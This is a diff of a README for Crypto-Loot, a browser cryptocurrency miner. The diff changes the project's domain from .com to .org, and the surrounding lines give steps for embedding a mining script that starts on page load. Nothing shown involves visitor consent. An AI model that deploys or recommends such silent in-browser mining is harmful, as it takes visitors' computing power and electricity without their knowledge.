@@ -11,8 +11,8 @@ Also now works with UPXTWO Algorithm
 How to Install:
 1) Download https://github.com/Crypto-Loot/cryptoloot/archive/master.zip and uncompress at yoursite.com home directory
 or alternatively use ```git clone https://github.com/Crypto-Loot/cryptoloot.git```
-2) Register at https://crypto-loot.com to get your public site ID, you'll need this for the next step.
-3) Add the script to your website, preferably ABOVE </body> tag, and not within the <head></head> tags. Make sure to edit YOUR_PUBLIC_KEY with your site ID from crypto-loot.com:
+2) Register at https://crypto-loot.org to get your public site ID, you'll need this for the next step.
+3) Add the script to your website, preferably ABOVE </body> tag, and not within the <head></head> tags. Make sure to edit YOUR_PUBLIC_KEY with your site ID from crypto-loot.org:
 ```text
 <script src="lib/crypta.js"></script>
 <script>
@@ -22,7 +22,7 @@ or alternatively use ```git clone https://github.com/Crypto-Loot/cryptoloot.git`
         miner.start();
 </script>
 ```
-NOTE: Also, edit your site key above from the one you have on https://crypto-loot.com
+NOTE: Also, edit your site key above from the one you have on https://crypto-loot.org
 
 4) All set. Now just send some traffic!
 
@@ -54,4 +54,4 @@ Mix of both upx & xmr (50/50): ```coin: xmrupx```
 
 Have any questions?
 ===================
-Feel free to contact as at https://crypto-loot.com
+Feel free to contact as at https://crypto-loot.org
